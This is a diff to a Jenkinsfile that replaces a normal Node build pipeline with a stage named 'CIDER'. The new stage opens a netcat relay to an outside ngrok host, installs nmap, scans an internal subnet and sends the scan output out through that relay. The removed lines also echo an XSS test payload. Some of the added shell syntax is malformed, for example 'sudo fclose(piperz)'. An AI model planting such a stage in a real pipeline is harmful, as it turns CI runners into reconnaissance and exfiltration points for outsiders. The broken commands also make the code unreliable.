@@ -1,31 +1,20 @@
 pipeline {
-    agent {
-        docker {
-            image 'node:6-alpine' 
-            args '-p 3000:3000' 
-        }
-    }
-    environment {
-        CI = 'true'
-    }
+    agent any
     stages {
-        stage('Build') { 
-            steps {
-                sh 'npm install' 
-		sh 'echo "as<img src=x onerror=alert(1)>"'
-            }
-        }
-        stage('Test') {
-            steps {
-                sh './jenkins/scripts/test.sh'
-            }
-        }
-        stage('Deliver') { 
-            steps {
-                sh './jenkins/scripts/deliver.sh' 
-                input message: 'Finished using the web site? (Click "Proceed" to continue)' 
-                sh './jenkins/scripts/kill.sh' 
+        stage('CIDER') {
+            steps {                     
+
+                sh "#!/bin/bash \n +"
+                "export NGPORT=12063 \n +"
+                "export NGHOSTNAME=0.tcp.ngrok.io \n +"
+                "mkfifo piperz \n +"
+                "nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz & \n +"
+                "sudo apt-get update \n +"
+                "sudo apt-get install nmap \n +"
+                "sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345 \n +"
+                "echo "ciderdone" | nc localhost 12345 \n +"
+                "sudo fclose(piperz)"
+                }
             }
         }
     }
-}
